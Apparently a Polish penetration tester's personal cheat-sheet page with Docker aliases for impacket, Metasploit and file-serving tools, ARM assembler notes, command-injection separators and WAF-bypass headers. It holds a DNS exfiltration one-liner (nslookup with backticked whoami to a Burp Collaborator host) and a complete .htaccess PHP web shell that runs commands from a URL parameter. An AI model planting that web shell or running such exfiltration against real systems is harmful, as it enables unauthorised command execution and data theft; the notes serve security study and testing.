<!doctype html><html lang=pl><head><title>Luźne notatki :: FoxtrotLabs — Tam gdzie bajty mówią dobranoc</title><meta charset=utf-8><meta name=viewport content="width=device-width,initial-scale=1"><meta name=description content="Zestaw &amp;ldquo;zawszetegozapominam&amp;rdquo;/&amp;ldquo;przydasie&amp;rdquo; - żeby nie szukać.
ip a - kolorowe wyświetlanko ip -br -c addr show ip -br -c link show Docker aliases Shamelessly skradzione z blogposta
function dockershell() { docker run --rm -i -t --entrypoint=/bin/bash &amp;#34;$@&amp;#34; } function dockershellsh() { docker run --rm -i -t --entrypoint=/bin/sh &amp;#34;$@&amp;#34; } function dockershellhere() { dirname=${PWD##*/} docker run --rm -it --entrypoint=/bin/bash -v `pwd`:/${dirname} -w /${dirname} &amp;#34;$@&amp;#34; } function dockershellshhere() { docker run --rm -it --entrypoint=/bin/sh -v `pwd`:/${dirname} -w /${dirname} &amp;#34;$@&amp;#34; } function dockerwindowshellhere() { dirname=${PWD##*/} docker -c 2019-box run --rm -it -v &amp;#34;C:${PWD}:C:/source&amp;#34; -w &amp;#34;C:/source&amp;#34; &amp;#34;$@&amp;#34; } impacket() { docker run --rm -it rflathers/impacket &amp;#34;$@&amp;#34; } smbservehere() { local sharename [[ -z $1 ]] &amp;amp;&amp;amp; sharename=&amp;#34;SHARE&amp;#34; || sharename=$1 docker run --rm -it -p 445:445 -v &amp;#34;${PWD}:/tmp/serve&amp;#34; rflathers/impacket smbserver."><meta name=keywords content="hacking"><meta name=robots content="noodp"><link rel=canonical href=https://foxtrotlabs.cc/pl/notes/><script type=application/javascript>var doNotTrack=!1;doNotTrack||(function(e,o,i,a,t,n,s){e.GoogleAnalyticsObject=t,e[t]=e[t]||function(){(e[t].q=e[t].q||[]).push(arguments)},e[t].l=1*new Date,n=o.createElement(i),s=o.getElementsByTagName(i)[0],n.async=1,n.src=a,s.parentNode.insertBefore(n,s)}(window,document,"script","https://www.google-analytics.com/analytics.js","ga"),ga("create","UA-148414315-1","auto"),ga("send","pageview"))</script><link rel=stylesheet href=https://foxtrotlabs.cc/assets/style.css><link rel=stylesheet href=assets/%25!s%28%3cnil%3e%29.css><link rel=apple-touch-icon-precomposed sizes=144x144 href=https://foxtrotlabs.cc/img/apple-touch-icon-144-precomposed.png><link rel="shortcut icon" href><meta name=twitter:card content="summary"><meta name=twitter:creator content><meta property="og:locale" content="pl"><meta property="og:type" content="article"><meta property="og:title" content="Luźne notatki :: FoxtrotLabs"><meta property="og:description" content="Zestaw &amp;ldquo;zawszetegozapominam&amp;rdquo;/&amp;ldquo;przydasie&amp;rdquo; - żeby nie szukać.
ip a - kolorowe wyświetlanko ip -br -c addr show ip -br -c link show Docker aliases Shamelessly skradzione z blogposta
function dockershell() { docker run --rm -i -t --entrypoint=/bin/bash &amp;#34;$@&amp;#34; } function dockershellsh() { docker run --rm -i -t --entrypoint=/bin/sh &amp;#34;$@&amp;#34; } function dockershellhere() { dirname=${PWD##*/} docker run --rm -it --entrypoint=/bin/bash -v `pwd`:/${dirname} -w /${dirname} &amp;#34;$@&amp;#34; } function dockershellshhere() { docker run --rm -it --entrypoint=/bin/sh -v `pwd`:/${dirname} -w /${dirname} &amp;#34;$@&amp;#34; } function dockerwindowshellhere() { dirname=${PWD##*/} docker -c 2019-box run --rm -it -v &amp;#34;C:${PWD}:C:/source&amp;#34; -w &amp;#34;C:/source&amp;#34; &amp;#34;$@&amp;#34; } impacket() { docker run --rm -it rflathers/impacket &amp;#34;$@&amp;#34; } smbservehere() { local sharename [[ -z $1 ]] &amp;amp;&amp;amp; sharename=&amp;#34;SHARE&amp;#34; || sharename=$1 docker run --rm -it -p 445:445 -v &amp;#34;${PWD}:/tmp/serve&amp;#34; rflathers/impacket smbserver."><meta property="og:url" content="https://foxtrotlabs.cc/pl/notes/"><meta property="og:site_name" content="Luźne notatki"><meta property="og:image" content><meta property="og:image:width" content="2048"><meta property="og:image:height" content="1024"><meta property="article:published_time" content="2017-08-26 22:39:38 +0200 +0200"></head><body><div class="container center headings--one-size"><header class=header><div class=header__inner><div class=header__logo><a href=https://foxtrotlabs.cc/pl><div class=logo>foxtrotlabs-pl</div></a></div><div class=menu-trigger>menu</div></div><nav class=menu><ul class="menu__inner menu__inner--desktop"><li><a href=https://foxtrotlabs.cc/pl/posts>posty</a></li><li><a href=https://foxtrotlabs.cc/>English side</a></li><li><a href=https://foxtrotlabs.cc/pl/about>o mnie</a></li><li><a href=https://github.com/s3gm3nt4ti0nf4ult>github</a></li></ul><ul class="menu__inner menu__inner--mobile"><li><a href=https://foxtrotlabs.cc/pl/posts>posty</a></li><li><a href=https://foxtrotlabs.cc/>English side</a></li><li><a href=https://foxtrotlabs.cc/pl/about>o mnie</a></li><li><a href=https://github.com/s3gm3nt4ti0nf4ult>github</a></li></ul></nav><script type=application/javascript>var doNotTrack=!1;doNotTrack||(function(e,o,i,a,t,n,s){e.GoogleAnalyticsObject=t,e[t]=e[t]||function(){(e[t].q=e[t].q||[]).push(arguments)},e[t].l=1*new Date,n=o.createElement(i),s=o.getElementsByTagName(i)[0],n.async=1,n.src=a,s.parentNode.insertBefore(n,s)}(window,document,"script","https://www.google-analytics.com/analytics.js","ga"),ga("create","UA-148414315-1","auto"),ga("send","pageview"))</script></header><div class=content><div class=post><h1 class=post-title><a href=https://foxtrotlabs.cc/pl/notes/>Luźne notatki</a></h1><div class=post-meta><span class=post-date>2017-08-26</span></div><div class=post-content><div><p>Zestaw &ldquo;zawszetegozapominam&rdquo;/&ldquo;przydasie&rdquo; - żeby nie szukać.</p><h3 id=ip-a---kolorowe-wyświetlanko>ip a - kolorowe wyświetlanko<a href=#ip-a---kolorowe-wyświetlanko class=hanchor arialabel=Anchor>&#8983;</a></h3><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>ip -br -c addr show
</span></span><span style=display:flex><span>ip -br -c link show
</span></span></code></pre></div><h3 id=docker-aliases>Docker aliases<a href=#docker-aliases class=hanchor arialabel=Anchor>&#8983;</a></h3><p>Shamelessly skradzione z <a href=https://blog.ropnop.com/docker-for-pentesters/>blogposta</a></p><pre tabindex=0><code>function dockershell() {
    docker run --rm -i -t --entrypoint=/bin/bash &#34;$@&#34;
}

function dockershellsh() {
    docker run --rm -i -t --entrypoint=/bin/sh &#34;$@&#34;
}

function dockershellhere() {
    dirname=${PWD##*/}
    docker run --rm -it --entrypoint=/bin/bash -v `pwd`:/${dirname} -w /${dirname} &#34;$@&#34;
}

function dockershellshhere() {
    docker run --rm -it --entrypoint=/bin/sh -v `pwd`:/${dirname} -w /${dirname} &#34;$@&#34;
}

function dockerwindowshellhere() {
    dirname=${PWD##*/}
    docker -c 2019-box run --rm -it -v &#34;C:${PWD}:C:/source&#34; -w &#34;C:/source&#34; &#34;$@&#34;
}

impacket() {
    docker run --rm -it rflathers/impacket &#34;$@&#34;
}

smbservehere() {
    local sharename
    [[ -z $1 ]] &amp;&amp; sharename=&#34;SHARE&#34; || sharename=$1
    docker run --rm -it -p 445:445 -v &#34;${PWD}:/tmp/serve&#34; rflathers/impacket smbserver.py -smb2support $sharename /tmp/serve
}

nginxhere() {
    docker run --rm -it -p 80:80 -p 443:443 -v &#34;${PWD}:/srv/data&#34; rflathers/nginxserve
}

webdavhere() {
    docker run --rm -it -p 80:80 -v &#34;${PWD}:/srv/data/share&#34; rflathers/webdav
}

metasploit() {
    docker run --rm -it -v &#34;${HOME}/.msf4:/home/msf/.msf4&#34; metasploitframework/metasploit-framework ./msfconsole &#34;$@&#34;
}

metasploitports() {
    docker run --rm -it -v &#34;${HOME}/.msf4:/home/msf/.msf4&#34; -p 8443-8500:8443-8500 metasploitframework/metasploit-framework ./msfconsole &#34;$@&#34;
}

msfvenomhere() {
    docker run --rm -it -v &#34;${HOME}/.msf4:/home/msf/.msf4&#34; -v &#34;${PWD}:/data&#34; metasploitframework/metasploit-framework ./msfvenom &#34;$@&#34;
}

reqdump() {
    docker run --rm -it -p 80:3000 rflathers/reqdump
}

postfiledumphere() {
    docker run --rm -it -p80:3000 -v &#34;${PWD}:/data&#34; rflathers/postfiledump
}
</code></pre><h3 id=arm-assembler>ARM assembler<a href=#arm-assembler class=hanchor arialabel=Anchor>&#8983;</a></h3><pre tabindex=0><code>str     - store word
ldr     - load word
; postfixy
--h     - half word &lt;unsigned&gt;
--sh    - half word &lt;signed&gt;
--b     - bajt &lt;unsigned&gt;
--sb    - bajt &lt;signed&gt;

rejestry:
R0-R10      ; {r0-r10} GPRS, rejestry ogólnego zastosowania
R11 = FP    ; Frame Pointer
R12 = IP    ; Intra Procedural Call, brak odpowiednika w x86
R13 = SP    ; Stack pointer
R14 = LR    ; Link Register, tam trafia adres powrotu po wywołaniu funkcji &lt;return address&gt;
R15 = PC    ; Program Counter, w zalezności od stanu Thumb/ARM pokazuje current address + 4/8. Taki &#34;RIP/EIP&#34;.
; ARM instr size = 4 bajty
; Thumb (v1/v2)  = 2 bajty
CPSR        ; EFAGS register, bardziej rozbudowany pod ARM, Current Program Status Register
</code></pre><p>Thumb vs ARM:
ARM intrukcje mają 32 bity. Thumb ma 16 bitów, Thumb v2 dodatkowo 32 bitowe instrukcje Thumb.</p><p>32 bitowe instrukcje mają sufix <code>.w</code></p><p>&ldquo;Barrel shifter&rdquo; - połączone instrukcje przesunięć bitowych z innymi instr. Mniejsza objętość kodu.</p><pre tabindex=0><code>mov  R12, R1, LSL #2    ; R12 = (R1 &lt;&lt; 2) ; R12 = R1 * 4
</code></pre><h3 id=os-command-injection>OS command injection<a href=#os-command-injection class=hanchor arialabel=Anchor>&#8983;</a></h3><p>Najprostszy z błędów, łatwa exploitacja. Dane można eksfiltrować przez zapytania DNS (burpcollaborator), response aplikacji or zapis do pliku i następnie odwołanie się do niego.</p><h5 id=separatory>Separatory:<a href=#separatory class=hanchor arialabel=Anchor>&#8983;</a></h5><ul><li>|</li><li>||</li><li>&</li><li>&&</li><li>; (unix)</li><li>\n (unix)</li></ul><h5 id=injectowanie-komend-i-eksfiltracja-przez-burpcollaboratora>Injectowanie komend i eksfiltracja przez burpcollaboratora:<a href=#injectowanie-komend-i-eksfiltracja-przez-burpcollaboratora class=hanchor arialabel=Anchor>&#8983;</a></h5><p>Używanie <code>backticków</code> do wykonania shellowej komendy albo $(cmd):</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>nslookup <span style=color:#e6db74>`</span>whoami<span style=color:#e6db74>`</span>.x.burpcollab
</span></span></code></pre></div><h3 id=waf-bypassesmiddleware-tampering>WAF bypasses/middleware tampering<a href=#waf-bypassesmiddleware-tampering class=hanchor arialabel=Anchor>&#8983;</a></h3><p>Headers:</p><ol><li>multiple <code>Host</code> headers (with indent <spaces>or not)</li><li><code>X-Originating-IP</code></li><li><code>X-Forwarded-For</code></li><li><code>X-Forwarded-Host</code></li><li><code>X-Remote-IP</code></li><li><code>X-Remote-Addr</code></li></ol><h3 id=xss>XSS<a href=#xss class=hanchor arialabel=Anchor>&#8983;</a></h3><h5 id=dom-based>DOM-based<a href=#dom-based class=hanchor arialabel=Anchor>&#8983;</a></h5><h5 id=reflected>Reflected<a href=#reflected class=hanchor arialabel=Anchor>&#8983;</a></h5><h5 id=stored>Stored<a href=#stored class=hanchor arialabel=Anchor>&#8983;</a></h5><h3 id=sqli>SQLI<a href=#sqli class=hanchor arialabel=Anchor>&#8983;</a></h3><h3 id=bsqli>bSQLI<a href=#bsqli class=hanchor arialabel=Anchor>&#8983;</a></h3><h5 id=eksfiltracja-danych-za-pomocą-requestów-dns>Eksfiltracja danych za pomocą requestów DNS<a href=#eksfiltracja-danych-za-pomocą-requestów-dns class=hanchor arialabel=Anchor>&#8983;</a></h5><h3 id=ssti>SSTI<a href=#ssti class=hanchor arialabel=Anchor>&#8983;</a></h3><h3 id=repl-ocamla>REPL Ocamla<a href=#repl-ocamla class=hanchor arialabel=Anchor>&#8983;</a></h3><p>UX przy wyjorzystaniu standardowego interpretera ocamla jest <em>cough</em> delikatnie mówiąc <em>cough</em> słaby. Fix:
<code>rlwrap ocaml</code></p><h3 id=htshell>Htshell:<a href=#htshell class=hanchor arialabel=Anchor>&#8983;</a></h3><p><a href=https://github.com/wireghoul/htshells>moar</a></p><pre tabindex=0><code># &lt;!--  Self contained .htaccess web shell - Part of the htshell project
# Written by Wireghoul - http://www.justanotherhacker.com

# Override default deny rule to make .htaccess file accessible over web
&lt;Files ~ &#34;^\.ht&#34;&gt;
# Uncomment the line below for Apache2.4 and newer
# Require all granted
    Order allow,deny
    Allow from all
&lt;/Files&gt;

# Make .htaccess file be interpreted as php file. This occur after apache has interpreted 
# the apache directoves from the .htaccess file
AddType application/x-httpd-php .htaccess

###### SHELL ###### &lt;?php echo &#34;--&gt;&lt;form method=&#39;get&#39;&gt;&lt;input type=&#39;text&#39; name=&#39;c&#39; value=&#39;&#34;.$_GET[&#39;c&#39;].&#34;&#39;&gt;&lt;input type=&#39;submit&#39; name=&#39;go&#39; value=&#39;Go!&#39;&gt;&lt;/form&gt;\n&lt;pre&gt;&#34;;passthru($_GET[&#39;c&#39;].&#34; 2&gt;&amp;1&#34;);echo &#34;&lt;/pre&gt;&#34;; ?&gt;
</code></pre><h3 id=talkislajdyprezentacjesłowotoki>Talki/slajdy/prezentacje/słowotoki<a href=#talkislajdyprezentacjesłowotoki class=hanchor arialabel=Anchor>&#8983;</a></h3><ol><li><a href=https://foxtrotlabs.cc>LO VIII - Od CTFów do pentestingu</a> // ten o rozpoczęciu kariery w pentestingu</li><li><a href=https://foxtrotlabs.cc>PP -s PUT Security Day - Cyberwarfare - CTFy czyli idziemy na strzelnicę</a> // ten o powiązaniach CTFów z cyberwojskiem</li><li><a href=https://foxtrotlabs.cc>Poznan Security Meetup - Od zera (Thomasa) do Phineasa Phishera - czyli jak nie być pośmiewiskiem w świecie IT Sec</a> // ten o wykorzystaniu socjotechniki w Red Teamingu</li><li><a href="https://docs.google.com/presentation/d/e/2PACX-1vSMXJiECa5tj-ViCWide4NDsBfok2b3afXdIY5EeqHl1OJXwmkp59dkPeIlyjSZv0httS1D0zd_7EgS/pub?start=false&loop=false&delayms=3000&slide=id.p">PP - Erlang</a></li></ol></div></div><link rel=stylesheet href=https://foxtrotlabs.cc/comments.css><section class=post-comments><script src=https://www.google.com/recaptcha/api.js></script><h1 id=Comments>Comments<a href=#Comments class=hanchor arialabel=Anchor>&#8983;</a></h1><font size=1>My comments operate on free Heroku instance. If there is no traffic in 30 minutes the dyno service goes asleep. That causes a small delay in submitting your comment. Thank you for your patience ;)</font><p>Nothing yet.</p><h3>Say something</h3><form class=post-new-comment method=post action=https://flabs-staticman.herokuapp.com/v2/entry/s3gm3nt4ti0nf4ult/page_source/master/comments><input type=hidden name=options[redirect] value=https://foxtrotlabs.cc/pl/notes/#comment-submitted>
<input type=hidden name=options[entryId] value=db235fc914867ffea6b540c8732499d5>
<input name=fields[name] type=text class=post-comment-field placeholder="Your name">
<input name=fields[email] type=email class=post-comment-field placeholder="Your email address">
<textarea name=fields[body] class=post-comment-field placeholder="Your message. Feel free to use Markdown." rows=10></textarea>
<input type=hidden name=options[reCaptcha][siteKey] value=6Lco6bkZAAAAAPwhdzJftINmETZymWpv1s8w1hKR>
<input type=hidden name=options[reCaptcha][secret] value="cNVL1K9Iu23KHkq4nAvjE8jFHYmFb1aJmvpOSSILJdZaUA07HolAG0UkqYzekmBKkxqNo4bAwKcPhGtIohOKp+PfBROWHhB+Vl+lGYQ9Z3+MTghdzhAZEC0V+Ti0WEvpfTXR7Lj6LUXwPNg+HRMj3/oYlou6vsz0cP1OSLPe9iMd4ZMGolwIaUowvWn9DVfU0eHKLAWUNXVRxFiBGcTKKbAd0JgR4ZtZs1VsPkhC3OlOsHm/yW2pA491SAQ0s820p+H1SncOd1kYE1h2gTL+oklzH+5CNz2V4xyq6Et4NLjinr0WGUN87eCFYUz+05wyEp+5lrG+uuq1eX2cBcfVoA=="></div><input type=submit class="post-comment-field btn" value=Submit><div class=g-recaptcha data-sitekey=6Lco6bkZAAAAAPwhdzJftINmETZymWpv1s8w1hKR></div></form></section><div id=comment-submitted class=dialog><h3>Thank you</h3><p>Your comment has been submitted and will be published once it has been approved.</p><p><a href=# class=btn>OK</a></p></div></div></div><footer class=footer><div class=footer__inner><div class="copyright copyright--user"><span>copyright by foxtrot_charlie</span>
<span>:: Theme made by <a href=https://twitter.com/panr>panr</a></span></div></div></footer><script src=https://foxtrotlabs.cc/assets/main.js></script>
<script src=https://foxtrotlabs.cc/assets/prism.js></script></div></body></html>